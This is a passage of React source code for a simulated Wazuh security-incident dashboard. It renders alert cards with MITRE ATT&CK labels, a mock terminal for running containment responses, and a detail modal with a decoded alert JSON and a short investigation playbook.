                  <option value="all" className="bg-[#05070c]">{text.filter_all_agents}</option>
                  <option value="WIN-SRV-DC01" className="bg-[#05070c]">WIN-SRV-DC01</option>
                  <option value="UBUNTU-WEB01" className="bg-[#05070c]">UBUNTU-WEB01</option>
                  <option value="WIN-LAPTOP-02" className="bg-[#05070c]">WIN-LAPTOP-02</option>
                  <option value="MAC-WORKSTATION" className="bg-[#05070c]">MAC-WORKSTATION</option>
                </select>
              </div>

              {/* Severity Checkbox */}
              <button
                onClick={() => setCriticalFilterOnly(!criticalFilterOnly)}
                className={`px-2.5 py-1.5 rounded-lg text-[10px] font-mono font-bold border transition-all flex items-center gap-1 cursor-pointer select-none ${
                  criticalFilterOnly 
                    ? "bg-red-950/40 border-red-500/40 text-red-400" 
                    : "bg-slate-900 border-white/5 text-slate-400 hover:text-slate-300"
                }`}
              >
                <AlertTriangle size={10} />
                <span>{text.filter_critical_only}</span>
              </button>
            </div>
          </div>

          {/* Main Alerts List Grid - fully scrollable */}
          <div className="flex-1 overflow-y-auto p-4 space-y-3.5">
            <div className="flex items-center gap-2 text-[10px] font-mono text-slate-500 px-1.5 bg-slate-950/30 py-1.5 rounded-lg border border-white/5 select-none">
              <Info size={11} className="text-[#26F0C4] shrink-0 ml-1" />
              <span>{text.click_alert_tip}</span>
            </div>

            {filteredIncidents.length === 0 ? (
              <div className="flex flex-col items-center justify-center py-16 text-slate-500 font-mono text-xs gap-2">
                <ShieldCheck size={28} className="text-[#26F0C4]" />
                <p>No active incidents matched the filter query.</p>
              </div>
            ) : (
              filteredIncidents.map(inc => (
                <div 
                  key={inc.id} 
                  onClick={() => setSelectedDetailIncident(inc)}
                  className={`border rounded-xl bg-slate-900/40 transition-all flex flex-col justify-between overflow-hidden cursor-pointer hover:bg-slate-900/60 ${
                    inc.status === 'mitigated' 
                      ? "border-emerald-500/20 shadow-[0_2px_10px_-4px_rgba(16,185,129,0.05)] bg-slate-950/25" 
                      : inc.status === 'mitigating'
                      ? "border-amber-500/40 shadow-[0_2px_15px_-4px_rgba(245,158,11,0.2)] animate-pulse"
                      : "border-red-500/25 hover:border-red-500/45 shadow-[0_4px_25px_-10px_rgba(239,68,68,0.15)]"
                  }`}
                >
                  {/* Alert Card Header */}
                  <div className="px-4 py-3 bg-slate-950/40 border-b border-white/5 flex flex-wrap items-center justify-between gap-2.5 text-xs font-mono">
                    <div className="flex items-center gap-2">
                      <span className="text-slate-500 font-semibold">{inc.timestamp}</span>
                      <span className="text-slate-700 font-bold">|</span>
                      <span className="text-[#26F0C4] font-black">{inc.agentName}</span>
                      <span className="text-slate-600">({inc.agentIp})</span>
                    </div>

                    <div className="flex items-center gap-2">
                      <span className="text-[10px] bg-slate-800 border border-white/5 text-slate-400 px-1.5 py-0.5 rounded">
                        Rule: {inc.ruleId}
                      </span>
                      <span className={`text-[10px] px-2 py-0.5 rounded font-bold font-mono ${
                        inc.level >= 12 
                          ? "bg-red-500/20 border border-red-500/40 text-red-400" 
                          : "bg-amber-500/15 border border-amber-500/30 text-amber-400"
                      }`}>
                        {text.header_level} {inc.level}
                      </span>
                    </div>
                  </div>

                  {/* Body Text */}
                  <div className="p-4 flex flex-col sm:flex-row items-start justify-between gap-4">
                    <div className="space-y-1.5 max-w-xl">
                      <h3 className="text-sm font-black text-white leading-tight font-mono tracking-tight flex items-center gap-2">
                        {inc.status === 'mitigated' ? (
                          <ShieldCheck size={14} className="text-emerald-400 shrink-0" />
                        ) : (
                          <ShieldAlert size={14} className="text-red-500 shrink-0" />
                        )}
                        <span>{inc.title}</span>
                      </h3>
                      <p className="text-[11px] text-slate-400 font-medium leading-relaxed">{inc.description}</p>
                      
                      {/* MITRE ATT&CK details */}
                      <div className="inline-flex items-center gap-1.5 bg-slate-950 border border-white/5 px-2 py-1 rounded text-[10px] font-mono text-slate-400 mt-2">
                        <span className="text-[#26F0C4] font-black">MITRE:</span>
                        <span>{inc.mitreId} ({inc.mitreTactic})</span>
                      </div>
                    </div>

                    {/* Active Incident Response Actions Trigger */}
                    <div className="sm:self-center shrink-0 w-full sm:w-auto">
                      {inc.status === 'mitigated' ? (
                        <div className="flex items-center justify-center gap-1.5 bg-emerald-950/20 border border-emerald-500/20 text-emerald-400 font-bold font-mono px-3.5 py-2 rounded-lg text-[11px] w-full text-center">
                          <CheckCircle2 size={13} />
                          <span>{text.status_mitigated}</span>
                        </div>
                      ) : inc.status === 'mitigating' ? (
                        <div className="flex items-center justify-center gap-1.5 bg-amber-950/20 border border-amber-500/20 text-amber-400 font-bold font-mono px-3.5 py-2 rounded-lg text-[11px] w-full text-center">
                          <RefreshCw size={11} className="animate-spin" />
                          <span>{text.terminal_btn_executing}</span>
                        </div>
                      ) : (
                        <button
                          onClick={(e) => { e.stopPropagation(); runActiveResponse(inc); }}
                          disabled={isTerminalRunning}
                          className="w-full sm:w-auto inline-flex items-center justify-center gap-2 rounded-lg bg-red-600 hover:bg-red-700 text-white shadow-[0_4px_15px_-5px_rgba(220,38,38,0.4)] px-3.5 py-2 text-[11px] font-black tracking-wider transition-all cursor-pointer active:scale-[0.98] disabled:opacity-50 disabled:pointer-events-none"
                        >
                          <Terminal size={12} />
                          <span>{text.btn_active_response.toUpperCase()}</span>
                        </button>
                      )}
                    </div>
                  </div>
                </div>
              ))
            )}
          </div>

        </div>

      </div>

      {/* Embedded Terminal Action Dialog Panel */}
      <AnimatePresence>
        {activeTerminalIncident && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-[120] flex items-center justify-center bg-slate-950/90 p-4 backdrop-blur-md"
          >
            <motion.div
              initial={{ scale: 0.95, y: 15 }}
              animate={{ scale: 1, y: 0 }}
              exit={{ scale: 0.95, y: 15 }}
              className="relative w-full max-w-xl flex flex-col overflow-hidden rounded-xl border border-white/10 bg-[#02040a] text-xs font-mono shadow-[0_0_30px_rgba(38,240,196,0.1)] h-[400px]"
            >
              {/* Terminal Titlebar */}
              <div className="flex items-center justify-between bg-slate-950 px-4 py-2.5 border-b border-white/5 select-none text-[10px] text-slate-400 uppercase font-black tracking-widest shrink-0">
                <div className="flex items-center gap-2">
                  <Terminal size={11} className="text-[#26F0C4]" />
                  <span>{text.terminal_title}</span>
                </div>
                <button 
                  onClick={() => {
                    if (!isTerminalRunning) setActiveTerminalIncident(null);
                  }}
                  disabled={isTerminalRunning}
                  className="p-1 text-slate-500 hover:text-white transition-colors rounded hover:bg-white/5 cursor-pointer disabled:opacity-30 disabled:pointer-events-none"
                >
                  <X size={12} />
                </button>
              </div>

              {/* Terminal Metadata Banner */}
              <div className="bg-[#09101d] px-4 py-2 border-b border-white/5 text-[10px] text-red-400 font-bold shrink-0 flex items-center justify-between animate-pulse">
                <span>{text.terminal_disclaimer}</span>
                <span className="bg-red-950 text-red-400 px-1 py-0.5 rounded border border-red-500/20 uppercase">CRITICAL</span>
              </div>

              {/* Output Scroll Log */}
              <div className="flex-1 p-4 overflow-y-auto space-y-1.5 bg-[#03050a] text-[#26F0C4] text-[11px] leading-relaxed selection:bg-[#26F0C4]/20 select-text">
                {/* Simulated CLI Header */}
                <div className="text-slate-500 mb-2">
                  <span>$ ./wazuh-agentd -r {activeTerminalIncident.actionScript} --agent {activeTerminalIncident.agentName}</span>
                </div>

                {terminalLogs.map((log, index) => (
                  <motion.div 
                    key={index}
                    initial={{ opacity: 0, x: -5 }}
                    animate={{ opacity: 1, x: 0 }}
                    transition={{ duration: 0.15 }}
                    className={
                      log.startsWith("[SUCCESS]") ? "text-emerald-400 font-black" :
                      log.startsWith("[!]") ? "text-red-400 font-black animate-pulse" :
                      log.startsWith("[+]") ? "text-[#26F0C4] font-semibold" : "text-slate-300"
                    }
                  >
                    {log}
                  </motion.div>
                ))}

                {isTerminalRunning && (
                  <span className="inline-block w-1.5 h-3.5 bg-[#26F0C4] ml-1 animate-pulse" />
                )}
              </div>

              {/* Terminal Control Footer */}
              <div className="px-4 py-3 bg-[#060b14] border-t border-white/5 shrink-0 flex items-center justify-between">
                <div className="text-[10px] text-slate-500 flex items-center gap-1">
                  <Wifi size={10} className="text-emerald-400" />
                  <span>Agent channel secure (SSH/TLS v1.3)</span>
                </div>

                <button
                  disabled={isTerminalRunning}
                  onClick={() => setActiveTerminalIncident(null)}
                  className={`px-3 py-1.5 rounded text-[10px] font-black tracking-wider transition-all font-mono uppercase cursor-pointer ${
                    isTerminalRunning 
                      ? "bg-slate-900 border border-white/5 text-slate-600 cursor-not-allowed" 
                      : "bg-[#26F0C4] text-[#05070e] hover:bg-[#26F0C4]/80 shadow-[0_0_15px_rgba(38,240,196,0.2)]"
                  }`}
                >
                  {isTerminalRunning ? text.terminal_btn_executing : text.terminal_btn_close}
                </button>
              </div>

            </motion.div>
          </motion.div>
        )}

        {selectedDetailIncident && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-[110] flex items-center justify-center bg-slate-950/85 p-4 backdrop-blur-md"
            onClick={() => setSelectedDetailIncident(null)}
          >
            <motion.div
              initial={{ scale: 0.95, y: 15 }}
              animate={{ scale: 1, y: 0 }}
              exit={{ scale: 0.95, y: 15 }}
              className="relative w-full max-w-4xl flex flex-col overflow-hidden rounded-xl border border-white/10 bg-[#05070e] text-xs font-sans shadow-[0_10px_40px_rgba(0,0,0,0.8)] max-h-[90vh]"
              onClick={(e) => e.stopPropagation()}
            >
              {/* Modal Titlebar */}
              <div className="flex items-center justify-between bg-slate-950 px-5 py-3.5 border-b border-white/5 select-none shrink-0">
                <div className="flex items-center gap-2">
                  <Database size={13} className="text-[#26F0C4]" />
                  <span className="text-xs font-black text-slate-200 tracking-wide font-mono uppercase">
                    {text.details_title} (ID: {selectedDetailIncident.id})
                  </span>
                </div>
                <button 
                  onClick={() => setSelectedDetailIncident(null)}
                  className="p-1 text-slate-500 hover:text-white transition-colors rounded hover:bg-white/5 cursor-pointer"
                >
                  <X size={14} />
                </button>
              </div>

              {/* Dual Pane Layout */}
              <div className="flex-1 overflow-y-auto grid grid-cols-1 md:grid-cols-2 divide-y md:divide-y-0 md:divide-x divide-white/5">
                
                {/* Left Pane: Decoded JSON Document */}
                <div className="p-5 flex flex-col min-h-0 bg-slate-950/50">
                  <h3 className="text-[10px] font-black font-mono tracking-widest text-slate-400 uppercase mb-3 flex items-center gap-1.5 shrink-0">
                    <Code size={11} className="text-[#26F0C4]" />
                    <span>ELASTICSEARCH / DECODED DOCUMENT</span>
                  </h3>
                  
                  <div className="flex-1 bg-[#020408] border border-white/5 rounded-lg p-4 font-mono text-[10px] text-[#26F0C4] leading-relaxed overflow-x-auto whitespace-pre select-text selection:bg-[#26F0C4]/20">
{`{
  "_index": "wazuh-alerts-4.x-${selectedDetailIncident.timestamp.slice(0,10)}",
  "_id": "alert-${selectedDetailIncident.id}",
  "timestamp": "${selectedDetailIncident.timestamp}",
  "rule": {
    "id": "${selectedDetailIncident.ruleId}",
    "level": ${selectedDetailIncident.level},
    "description": "${selectedDetailIncident.title}",
    "mitre": {
      "id": ["${selectedDetailIncident.mitreId}"],
      "tactic": ["${selectedDetailIncident.mitreTactic}"]
    }
  },
  "agent": {
    "id": "${selectedDetailIncident.id === 'inc-01' ? '001' : selectedDetailIncident.id === 'inc-02' ? '002' : '003'}",
    "name": "${selectedDetailIncident.agentName}",
    "ip": "${selectedDetailIncident.agentIp}",
    "os": "${selectedDetailIncident.agentOs}"
  },
  "manager": {
    "name": "wazuh-master-cluster-01"
  },
  "decoder": {
    "name": "${selectedDetailIncident.ruleId.startsWith('100') ? 'sysmon-windows' : 'sshd'}"
  }
}`}
                  </div>
                </div>

                {/* Right Pane: Investigation Playbook */}
                <div className="p-5 flex flex-col justify-between bg-slate-900/10">
                  <div className="space-y-4">
                    <h3 className="text-[10px] font-black font-mono tracking-widest text-slate-400 uppercase flex items-center gap-1.5">
                      <FileText size={11} className="text-red-400" />
                      <span>{text.playbook_steps}</span>
                    </h3>

                    <div className="space-y-3 font-sans">
                      <div className="bg-slate-950/40 border border-white/5 p-3 rounded-lg">
                        <span className="text-[10px] font-mono font-bold text-red-400 block mb-1">RECOMMENDED POSTURE RESPONSE</span>
                        <p className="text-[11px] text-slate-300 leading-normal">
                          Rule violation detected on agent <span className="text-[#26F0C4] font-bold">{selectedDetailIncident.agentName}</span>. 
                          The severity level of <span className="text-red-400 font-bold">{selectedDetailIncident.level}</span> denotes active hostile compromise behavior that requires containment execution immediately.
                        </p>
                      </div>

                      <div className="space-y-2">
                        <div className="flex gap-2.5">
                          <span className="w-5 h-5 rounded-full bg-slate-800 text-slate-300 font-mono text-[10px] font-black flex items-center justify-center shrink-0">1</span>
                          <div>
                            <span className="text-[11px] font-black text-slate-200 block">Verify Parent Process & PID</span>
                            <span className="text-[10px] text-slate-400 leading-normal block mt-0.5">
                              Audit full process arguments to rule out legitimate administrator task schedules or automated endpoint deployments.
                            </span>
                          </div>
                        </div>

                        <div className="flex gap-2.5">
                          <span className="w-5 h-5 rounded-full bg-slate-800 text-slate-300 font-mono text-[10px] font-black flex items-center justify-center shrink-0">2</span>
                          <div>
                            <span className="text-[11px] font-black text-slate-200 block">Extract SHA256 of Target Binaries</span>
                            <span className="text-[10px] text-slate-400 leading-normal block mt-0.5">
                              Query threat intelligence databases (e.g. VirusTotal API) for dynamic reputation matching and indicators of compromise (IOCs).
                            </span>
                          </div>
                        </div>

                        <div className="flex gap-2.5">
                          <span className="w-5 h-5 rounded-full bg-slate-800 text-slate-300 font-mono text-[10px] font-black flex items-center justify-center shrink-0">3</span>
                          <div>
                            <span className="text-[11px] font-black text-slate-200 block">Initiate Containment Policy</span>
                            <span className="text-[10px] text-slate-400 leading-normal block mt-0.5">
                              Execute the corresponding Active Response action: <span className="font-mono text-red-400">{selectedDetailIncident.actionScript}</span> on the endpoints to mitigate the thread state.
                            </span>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* Active Response button from Playbook */}
                  <div className="pt-4 mt-4 border-t border-white/5 flex items-center justify-between">
                    <div className="text-[10px] font-mono text-slate-500">
                      Response Status: <span className={selectedDetailIncident.status === 'mitigated' ? 'text-emerald-400 font-bold' : 'text-red-400 font-bold'}>{selectedDetailIncident.status.toUpperCase()}</span>
                    </div>

                    {selectedDetailIncident.status === 'mitigated' ? (
                      <div className="inline-flex items-center gap-1.5 bg-emerald-950/20 border border-emerald-500/20 text-emerald-400 font-bold font-mono px-4 py-2 rounded-lg text-[10px]">
                        <CheckCircle2 size={12} />
                        <span>CONTAINED</span>
                      </div>
                    ) : (
                      <button
                        onClick={() => {
                          setSelectedDetailIncident(null);
                          runActiveResponse(selectedDetailIncident);
                        }}
                        disabled={isTerminalRunning}
                        className="inline-flex items-center gap-2 rounded-lg bg-red-600 hover:bg-red-700 text-white shadow-[0_4px_15px_-5px_rgba(220,38,38,0.4)] px-4 py-2 text-[10px] font-black tracking-wider transition-all cursor-pointer"
                      >
                        <Terminal size={11} />
                        <span>RUN PLAYBOOK CONTAINMENT</span>
                      </button>
                    )}
                  </div>
                </div>

              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
};

export default WazuhIncidentResponseDashboard;
